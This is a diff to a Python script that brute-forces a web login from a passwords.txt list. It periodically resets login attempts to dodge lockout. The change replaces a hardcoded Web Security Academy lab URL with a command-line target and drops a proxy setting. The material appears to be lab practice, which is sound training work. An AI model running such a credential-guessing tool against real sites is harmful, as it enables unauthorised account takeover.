@@ -1,12 +1,18 @@
 import asyncio
 import aiohttp
 from aiofiles import open as aopen
+import sys
+
+# Usage checking
+if len(sys.argv) != 2:
+    print("Usage: extention.py <url>")
+    sys.exit(1)
+
 # Disable SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-PROXY = 'http://172.29.240.1:8080'
-urlab = 'https://0ae800fa03672f378127938900a50026.web-security-academy.net/login'
+urlab = sys.argv[1]
 BATCH_SIZE = 2  # Number of passwords to try before checking if we need to reset
 
 async def passwords_list_generator(file_path, batch_size):
@@ -27,7 +33,6 @@ async def reset_login_attempts(session):
 
 async def main():
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-        session.proxies = {'http': PROXY, 'https': PROXY}
         
         password_gen = passwords_list_generator('passwords.txt', BATCH_SIZE)
         attempt_count = 0
@@ -41,7 +46,7 @@ async def main():
                     print(f"Password found: {password}")
                     return
                 print(f"{password} is incorrect")
-            
+
             attempt_count += len(batch)
             if attempt_count >= BATCH_SIZE:
                 print("Resetting login attempts")
